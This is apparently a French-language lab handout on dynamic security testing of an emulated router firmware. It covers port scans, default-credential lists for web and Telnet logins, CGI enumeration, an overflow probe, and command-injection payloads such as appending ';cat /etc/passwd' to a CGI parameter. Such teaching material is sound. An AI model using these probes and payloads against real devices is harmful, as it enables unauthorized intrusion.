# TP 4 — Analyse Dynamique et Détection de Vulnérabilités

## Objectifs

- Identifier les services exposés
- Analyser les faiblesses de sécurité

---

## Prérequis

- VM émulée depuis TP3 en cours d'exécution
- `IP_EMULEE` = adresse IP de la VM Firmadyne

---

## Étapes

### 1. Scanner les ports ouverts (depuis l'hôte)

```bash
export IP_EMULEE=192.168.x.x   # Remplacez par votre IP
nmap -sV -sC $IP_EMULEE
nmap -p- $IP_EMULEE             # Scan complet de tous les ports
```

**Résultats attendus :**
- Port 80/443 : interface web HTTP/HTTPS
- Port 23 : Telnet (souvent ouvert sur vieux firmwares !)
- Port 22 : SSH
- Port 53 : DNS

### 2. Vérifier les services actifs (depuis la VM)

```bash
netstat -tulnp
dmesg | tail -20
```

### 3. Test des credentials par défaut

```bash
# Tester l'interface web
curl -v http://$IP_EMULEE/
curl -v -u admin:admin http://$IP_EMULEE/cgi-bin/login.cgi

# Tenter Telnet
telnet $IP_EMULEE
# Essayer : admin/admin, root/root, admin/1234, root/(vide)
```

**Credentials courants à tester :**

| Login | Mot de passe |
|-------|-------------|
| admin | admin |
| admin | password |
| root | root |
| admin | (vide) |
| root | (vide) |
| admin | 1234 |
| guest | guest |

### 4. Analyse des services HTTP

```bash
# Enumérer les chemins web
curl http://$IP_EMULEE/
curl http://$IP_EMULEE/cgi-bin/
curl http://$IP_EMULEE/admin/

# Tester des CGI communs
for path in login.cgi index.cgi admin.cgi setup.cgi; do
  curl -s -o /dev/null -w "%{http_code} $path\n" http://$IP_EMULEE/cgi-bin/$path
done
```

### 5. Observer les vulnérabilités

#### A. Credentials par défaut

```bash
# Test d'authentification basique HTTP
curl -v -u admin:admin http://$IP_EMULEE/
```

#### B. Buffer overflow potentiel

```bash
# Test avec une entrée longue sur un formulaire CGI
python3 -c "print('A'*1000)" | curl -d @- http://$IP_EMULEE/cgi-bin/login.cgi
```

#### C. Scripts CGI non sécurisés

```bash
# Test d'injection de commande via paramètres
curl "http://$IP_EMULEE/cgi-bin/test.cgi?param=test;ls"
curl "http://$IP_EMULEE/cgi-bin/ping.cgi?ip=127.0.0.1;cat /etc/passwd"
```

> ⚠️ **À titre pédagogique uniquement, sur votre VM isolée.**

---

## Vulnérabilités types dans les firmwares Wi-Fi

| Type | Description | Exemple |
|------|-------------|---------|
| Credentials par défaut | Login/password non changé | `admin:admin` |
| Buffer overflow | Entrée non limitée en taille | `strcpy()` sans vérification |
| Command injection | Paramètre passé directement à `system()` | `ping.cgi?ip=x;cat /etc/passwd` |
| Telnet ouvert | Service non chiffré | Port 23 accessible |
| Clés privées embarquées | Clé SSH/TLS dans le firmware | Trouvée dans `/etc/` |
| Mises à jour non signées | Firmware upgradé sans vérification | Pas de hash/signature |

---

## Remplir vos observations

➡️ Complétez le fichier [`observations.md`](./observations.md)
